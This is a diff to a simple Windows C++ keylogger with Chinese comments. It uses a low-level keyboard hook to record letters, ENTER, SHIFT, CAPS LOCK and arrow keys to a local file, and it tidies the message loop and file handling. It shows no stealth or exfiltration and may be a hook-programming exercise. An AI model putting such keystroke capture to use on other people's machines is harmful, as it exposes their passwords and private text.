@@ -31,11 +31,27 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     {
         if (0x41 <= ks->vkCode && ks->vkCode <= 0x5A)
         {
-            outFile << "Keys" << ks->vkCode - 0x41 + 'A' << "\r\n";
+            outFile << "Keys" << ks->vkCode - 0x41 + 'A' << "pressed" << std::endl;
+        }
+        else if (ks->vkCode == 0x0D)
+        {
+            outFile << "Keys ENTER pressed" << std::endl;
+        }
+        else if (ks->vkCode == 0x10)
+        {
+            outFile << "Keys SHIFT pressed" << std::endl;
         }
         else if (ks->vkCode == 0x14)
         {
-            outFile << "Keys CAPS LOCK pressed\n";
+            outFile << "Keys CAPS LOCK pressed" << std::endl;
+        }
+        else if (ks->vkCode == 0x25)
+        {
+            outFile << "Keys LEFT ARROW pressed" << std::endl;
+        }
+        else if (ks->vkCode == 0x27)
+        {
+            outFile << "Keys RIGHT ARROW pressed" << std::endl;
         }
     }
 
@@ -54,29 +70,23 @@ int _tmain(int argc, _TCHAR *argv[])
     if (keyboardHook == 0)
     {
         printf("挂钩键盘失败\n");
+        outFile.close();
         return -1;
     }
 
     // 不可漏掉消息处理，否则程序会卡死
     MSG msg;
-    while (1)
+    while (GetMessageA(&msg, NULL, 0, 0)) // 如果消息队列中有信息
     {
-        // 如果消息队列中有信息
-        if (PeekMessageA(&msg, NULL, NULL, NULL, PM_REMOVE))
-        {
-            TranslateMessage(&msg);
-
-            DispatchMessageW(&msg);
-        }
-        else
-        {
-            Sleep(0);
-        }
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+        Sleep(1);
     }
 
     // 删除钩子
     UnhookWindowsHookEx(keyboardHook);
 
+    outFile.close();
     return 0;
     
 }
